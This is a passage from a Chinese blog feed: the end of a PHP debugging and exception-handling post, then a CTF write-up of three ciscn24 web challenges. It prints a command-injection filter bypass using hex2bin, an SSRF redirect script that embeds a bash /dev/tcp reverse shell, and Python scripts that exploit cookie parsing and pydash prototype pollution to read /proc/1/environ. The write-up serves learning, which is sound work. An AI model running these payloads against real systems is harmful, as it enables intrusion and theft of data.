<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 针对异常</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 3. 用于监督变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[!!!]:  &#x27;</span>,  <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>ref: [<a href="https://stackoverflow.com/questions/845021/how-can-i-get-useful-error-messages-in-php]%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BA%94%E5%AF%B9%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%86%85%E7%BD%AEdebugger%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E6%AF%94%E5%A6%82%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%AA%E6%9C%89vim%E6%97%B6">https://stackoverflow.com/questions/845021/how-can-i-get-useful-error-messages-in-php]，可以应对编辑器中没有内置debugger的情况，比如服务端只有vim时</a></li><li>主要运用的就是：报错+异常处理+输出的做法</li></ol><h3 id="第二答案-phpdbg"><a href="#第二答案-phpdbg" class="headerlink" title="第二答案: phpdbg"></a>第二答案: phpdbg</h3><ol><li>具体看文档并搜这些的[<a href="https://www.php.net/manual/en/book.phpdbg.php]">https://www.php.net/manual/en/book.phpdbg.php]</a></li></ol><h3 id="php异常处理"><a href="#php异常处理" class="headerlink" title="php异常处理"></a>php异常处理</h3><blockquote><p>顺便了解一下主要用法吧</p></blockquote><ol><li><p>PHP 5 开始提供了异常，PHP 8.0.0 起，throw 关键词现在开始是表达式，可用于任何表达式上下文。在此之前，它是语句，必须独占一行</p></li><li><p>这里只讲2个东西，抛出和处理见上witout xdebug</p><ol><li>自定义</li><li>顶层处理器</li></ol></li><li><p>自定义</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须 extends Exception</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 重写输出的调用函数 errorMessage()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$errorMsg</span> = <span class="string">&#x27;错误行号 &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getLine</span>().<span class="string">&#x27; in &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFile</span>().<span class="string">&#x27;: &lt;b&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getMessage</span>().<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$errorMsg</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>顶层处理器</p><ol><li>如果异常没有被捕获，而且又没用使用 set_exception_handler() 作相应的处理的话，那么将发生一个严重的错误（致命错误），并且输出 “Uncaught Exception” （未捕获异常）的错误消息</li><li>使用<code>set_exception_handler</code><strong>类似反射设置回调处理函数</strong>，自动捕获所有没有被catch的异常</li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myException</span>(<span class="params"><span class="variable">$exception</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;Exception:&lt;/b&gt; &quot;</span> , <span class="variable">$exception</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_exception_handler</span>(<span class="string">&#x27;myException&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Uncaught Exception occurred&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>内置<ol><li>[<a href="https://www.php.net/manual/zh/features.commandline.webserver.php]">https://www.php.net/manual/zh/features.commandline.webserver.php]</a></li></ol></li><li>fpm+nginx<ol><li>docker来源[<a href="https://hub.docker.com/]">https://hub.docker.com/]</a></li><li>[<a href="https://www.runoob.com/docker/docker-install-php.html]">https://www.runoob.com/docker/docker-install-php.html]</a></li></ol></li><li>debug<ol><li>[<a href="https://www.runoob.com/php/php-exception.html]">https://www.runoob.com/php/php-exception.html]</a></li><li>[<a href="https://stackoverflow.com/questions/845021/how-can-i-get-useful-error-messages-in-php]">https://stackoverflow.com/questions/845021/how-can-i-get-useful-error-messages-in-php]</a></li><li>[<a href="https://xdebug.org/]">https://xdebug.org/]</a></li><li>[<a href="https://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]">https://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]</a></li><li>[<a href="https://www.php.net/manual/en/book.phpdbg.php]">https://www.php.net/manual/en/book.phpdbg.php]</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn24</title>
      <link href="/2024/12/01/ciscn24/"/>
      <url>/2024/12/01/ciscn24/</url>
      
        <content type="html"><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><h3 id="simple-php-思路流程"><a href="#simple-php-思路流程" class="headerlink" title="simple_php: 思路流程"></a>simple_php: 思路流程</h3><ol><li><p>命令执行黑名单</p></li><li><p><strong>S1: 先列出有哪些命令可以用</strong>，这里还是靠经验</p><ol><li><p>就拼凑思路上来说，过滤太多又不回显是比较难拼凑的，<strong>搭个本地环境可以测试</strong>，用docker搭建比较好</p>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不太行</span></span><br><span class="line">-</span><br><span class="line">base32</span><br><span class="line">rev</span><br></pre></td></tr></table></figure></li></ol></li><li><p>过滤有点多，<strong>先考虑编码绕过</strong>，shell的编码函数被ban了，有没有别的编码函数？php里有，怎么在shell中使用php？<code>php -r</code>，ok</p></li><li><p>escapeshellcmd的影响，似乎有再套一层字符串，那就不是影响了再字符串里，找一下编码有<code>hexo2bin()</code>，构造一下payload<code>php -r system(hex2bin(6c73));</code></p><ol><li>报错，思路应该可以是这个，但是报错了<code>Parse error: syntax error, unexpected &#39;c73202d6c&#39; (T_STRING), expecting &#39;)&#39; in Command line code on line 1</code>，查了一下加自己思考感觉可能是变成数字了，现在只要解决这个问题就可以执行了</li><li>经过测试可以使用0x表示十六进制，但是会转换成十进制，这里<strong>需要将数字-&gt;字符串</strong>，强制转换行不？可行，不过需要**非数字开头(这个点要敏感点)**，使用截取<ol><li><strong>十进制短命令运行法(本地通，远不同)</strong>: 一开始总是用进制转换去解决<code>php -r system(hex2bin(dechex(strval(27763))));</code>，处理后是<code>php -r system\(hex2bin\(dechex\(strval\(27763\)\)\)\)\;</code>，不失为一种办法，虽然后面发现了对长度有限制，总之<strong>思路的还是很重要的，先选简单的</strong></li></ol></li></ol></li><li><p>这样就可以执行任意命令了，payload: <code>cmd=php -r system(hex2bin(substr(a6c73,1)));</code></p></li><li><p>本地找不到flag文件，并且环境变量中也没有，考虑数据库，<code>cat /etc/passwd</code></p></li><li><p>发现mysql，我们当前用户为www-data，还有知道一个root，试一试有没有机会，最终在<code>mysql -u www-data;echo $?</code>成功获取返回0，妙</p><ol><li>mysql后面就是，root用户试一下，www-data里的test是空的不行<code>mysql -u root -p&#39;root&#39; -e &quot;use PHP_CMS;select * from Flag_jdjvn&quot;</code>这样转成hex然后执行</li></ol></li></ol><h3 id="simple-php-核心要点"><a href="#simple-php-核心要点" class="headerlink" title="simple_php: 核心要点"></a>simple_php: 核心要点</h3><ol><li><p><strong>重要的是深入细化问题</strong></p><ol><li>什么对什么的什么做了什么事情，比如黑名单对bash的编码进行了过滤，就可以考虑使用php中的来实现</li></ol></li><li><p><strong>对于过滤问题</strong></p><ol><li><p>注意到escpaeshellcmd作用的原理是添加\，传入cmd后作为字符串并不会有影响，这里只是防止绕过在本php页面处理而已，仍然可以使用那些字符，其实可以<strong>转为绕过引号的在shell里</strong></p></li><li><p>可以列一下哪些常用命令还可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-</span><br><span class="line">php</span><br><span class="line">rev</span><br><span class="line">paste</span><br><span class="line">base32</span><br></pre></td></tr></table></figure></li></ol></li><li><p>命令执行-&gt;代码执行-&gt;命令执行现在是一个普遍的知识点了</p></li><li><p>数据库有些也是考察的内容，flag藏在里面</p><ol><li>哪里能藏东西？环境变量，然后就是数据库了</li></ol></li><li><p>mysql可以非交互式地进行查询，参数可以看文档&#x2F;搜索&#x2F;–help猜-e</p></li><li><p><strong>坑点</strong></p><ol><li><code>mysql -u root -p&#39;root&#39;</code>中的p后不能有空格</li><li>对于跑不通的命令比赛就别死磕了，试试别的思路，比如这里本地通ctfsow不通</li></ol></li></ol><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><h3 id="easycms-思路"><a href="#easycms-思路" class="headerlink" title="easycms: 思路"></a>easycms: 思路</h3><blockquote><p>看起来又像是信息题？</p></blockquote><ol><li>失败的尝试<ol><li>github种的readme看后，有test.php</li><li>没有具体的思路方向来呜呜，看题解 –&gt; ？admin.php可以访问到啊，ctfshow是不是没有整理干净啊，算了</li></ol></li><li>复现<ol><li>dirsearch开扫，有Readme.txt，后台没法爆破36乃至更多的四次方，有点难搞了，<strong>需要一个无需后台验证的方法</strong>，并且可以打ssrf到flag.php那里，可以任意命令执行</li><li>test.php种有版本信息<br><img src="/pic/ciscn24/easycms_testphp.png" alt="pic"></li><li>找找历史漏洞，官网&#x2F;github上的issue这些，关键词：漏洞，vul，bug<ol><li>[<a href="https://www.xunruicms.com/bug/]">https://www.xunruicms.com/bug/]</a></li></ol></li><li>有一个可疑的ssrf？**直接搜qrcode，有一个dr_qrcode()**，看看文档<br><img src="/pic/ciscn24/%E5%8F%AF%E8%83%BD%E7%9A%84ssrf.png" alt="pic"></li><li><strong>clone个源码，并看着文档来审一下[<a href="https://www.xunruicms.com/doc/203.html]">https://www.xunruicms.com/doc/203.html]</a></strong></li><li>先暂时停留在这里吧<code>?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&amp;text=xxxx:9999/1.php&amp;size=5&amp;level=H</code></li></ol></li><li>时隔n天，我回来了，把php环境搞清楚了<ol><li><p>这里加个GIF89a</p></li><li><p>Docker起个服务302外力使其跳转，先<code>?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&amp;text=http://xxxx:9999/1.php&amp;size=5&amp;level=H</code><strong>注意要<code>http://xxxx:9999</code></strong></p><ol><li>注意header之前不能有输出，ai说的</li><li>可以加个日志来实现自动记录</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 反弹shell</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx/9999 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="variable">$evil</span> = <span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=&quot;</span>.<span class="variable">$cmd</span>;</span><br><span class="line"><span class="comment">// 设置重定向头信息</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="variable">$evil</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure></li><li><p>这里ctfshow搞不出来，看了网上大家都这样</p></li></ol></li></ol><h3 id="easycms-总结"><a href="#easycms-总结" class="headerlink" title="easycms: 总结"></a>easycms: 总结</h3><ol><li>搜索+推断，这里qr_code的定位可以依赖于Api文档&#x2F;api文件，一般会是入口</li><li>可以使用302跳转强制ssrf</li></ol><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><h3 id="sanic-思路"><a href="#sanic-思路" class="headerlink" title="sanic: 思路"></a>sanic: 思路</h3><ol><li><p>尝试</p><ol><li>有源码，很明显的lower绕过加原型链污染</li><li>又完damn了，网上找不到一点信息，很明显的lower眼前怎么就过不了呢？</li></ol></li><li><p>题解wp环节</p><ol><li><p>原来要源码，<strong>网上找不到就看看源码吧</strong></p></li><li><p>在输入端似乎无法搞动作，看看**接收端的解析规则(一入一出很合理啊)**，进到sanic去看看</p><ol><li><p>login的解析对象request是谁，打印出来看看，这一看不要紧，原来是<code>&lt;class &#39;sanic.request.types.Request&#39;&gt;</code>，不错，有入口了</p></li><li><p>再对于模块中找到cookie，在一步一步深入，发现了以下这段代码(找到和wp一样的了)，<strong>还是要审细一点，看漏了耽搁了半小时wc</strong></p><ol><li>第一个用来过滤特殊的字符</li><li>允许八进制\077这样</li><li><code>[\\]</code>：匹配反斜杠。<code>.</code>：匹配任意单个字符（除了换行符</li><li><strong>结论: 需要使用引号包裹八进制字符来绕过session的检查</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析链</span></span><br><span class="line"><span class="built_in">print</span>(request)    <span class="comment"># 在/login中加的，用于判断类型&lt;class &#x27;sanic.request.types.Request&#x27;&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:   <span class="comment"># pycharm中可以搜索sanic.request.types.Request</span></span><br><span class="line"><span class="variable language_">self</span>.get_cookies()</span><br><span class="line"><span class="variable language_">self</span>.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))  <span class="comment"># 进入到parsed_cookie中</span></span><br><span class="line">value = _unquote(value)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">COOKIE_NAME_RESERVED_CHARS = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">&#x27;[\x00-\x1f\x7f-\xff()&lt;&gt;@,;:\\\\&quot;/[\\]?=&#123;&#125; \x09]&#x27;</span></span><br><span class="line">)</span><br><span class="line">OCTAL_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;\\[0-3][0-7][0-7]&quot;</span>)</span><br><span class="line">QUOTE_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;[\\].&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># !!! 关键的调用处如下</span></span><br><span class="line"><span class="keyword">if</span> COOKIE_NAME_RESERVED_CHARS.search(name):  <span class="comment"># no cov</span></span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">   value = _unquote(value) <span class="comment"># 在_unquote中才有对OCTAL_PATTERN和QUOTE_PATTERN的引用</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>绕过;后现在有需要搞_.的绕过了，查查资料，不行看源码吧</p><ol><li><p>这里的目标应该可以是&#x2F;src的<code>__file__</code>，也就是修改全局变量的方式，那能到哪里去呢？任意文件读取，&#x2F;proc&#x2F;1&#x2F;environ，应该就这里，感觉到不了rce</p></li><li><p>绕过</p><ol><li>这里网上找不到，看看解析的源码，pydash5.1.12中的，重点关注路径那里就ok了</li><li>真找到了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_LIST_INDEX = re.<span class="built_in">compile</span>(<span class="string">r&quot;^\[\d+\]$&quot;</span>)</span><br><span class="line"><span class="comment"># 结合过滤在python中使用&quot;_\\\\.&quot;来进行绕过</span></span><br><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure></li></ol></li><li><p>最终payload与分析链</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析链</span></span><br><span class="line">pydash.set_(pollute, key, value)</span><br><span class="line"><span class="keyword">return</span> set_with(obj, path, value)</span><br><span class="line"><span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br><span class="line">tokens = to_path_tokens(path)    <span class="comment"># 这一步敏感，因为我们的目的就是path的解析</span></span><br><span class="line">keys = [</span><br><span class="line">         PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">         <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">         <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">         <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">     ]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://e4630784-9448-45a8-9d3c-65652b721aaf.challenge.ctf.show/&quot;</span></span><br><span class="line">route1 = <span class="string">&quot;login/&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;admin/&quot;</span></span><br><span class="line">route3 = <span class="string">&quot;src/&quot;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Session 对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始的 cookies</span></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span>)   <span class="comment"># 要有引号包起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送带有特定 cookie 的 GET 请求到 login 路由</span></span><br><span class="line">r = session.get(host + route1, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发送 POST 请求到 admin 路由，包含特定的 json 数据</span></span><br><span class="line">path_data = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;/proc/1/environ&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2]----------&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = session.post(host + route2, json=path_data, timeout=<span class="number">5.0</span>, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!]time out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 发送 GET 请求到 src 路由并获取文本</span></span><br><span class="line">r = session.get(host + route3, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li></ol><h3 id="sanic-不对没有这么简单"><a href="#sanic-不对没有这么简单" class="headerlink" title="sanic: 不对没有这么简单"></a>sanic: 不对没有这么简单</h3><blockquote><p>上面说到在ctfshow中可以&#x2F;proc&#x2F;1&#x2F;environ读到flag，但是看wp说现实中是不行的</p></blockquote><ol><li><p>不同的点：实际情况中无法猜测到flag的所在位置，必须进一步解决</p></li><li><p>重要的还是思想，这里应该是无法rce？有目录就很容易了，可以任意读文件</p><ol><li><p>看看static吧，就剩这一个切入口了，搜索魅力时刻到了，“sanic获取static的可视化目录界面”，发现directory_view，<strong>如果可以还可以污染指定为别的目录进行查看，无敌了</strong>，先解决view吧</p></li><li><p>这里能做到的就是污染了，现在能做到就是污染，写写污染链子，<strong>艹，失败了，但还是有学到的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>._apply_static(static)/<span class="variable language_">self</span>._future_statics.add(static) <span class="comment"># 一开始就两个？问题不大，先看static</span></span><br><span class="line">_future_statics</span><br><span class="line">directory_handler</span><br><span class="line">directory_view</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试的payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>:<span class="string">&quot;__init__\\\\.__globals__\\\\.Sanic._future_statics.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>:<span class="string">&quot;True&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>看别人wp+调试的payload</p><ol><li>注意json可以传递对应的值，所以要对应类型比如布尔的true这些</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://localhost:5555/&quot;</span></span><br><span class="line"><span class="comment"># host=&quot;http://f6642576-3813-4cd6-ae6f-7a6dc692a220.challenge.ctf.show/&quot;</span></span><br><span class="line">route1 = <span class="string">&quot;login/&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;admin/&quot;</span></span><br><span class="line">route3 = <span class="string">&quot;src/&quot;</span></span><br><span class="line">route4 = <span class="string">&quot;static/&quot;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Session 对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始的 cookies</span></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送带有特定 cookie 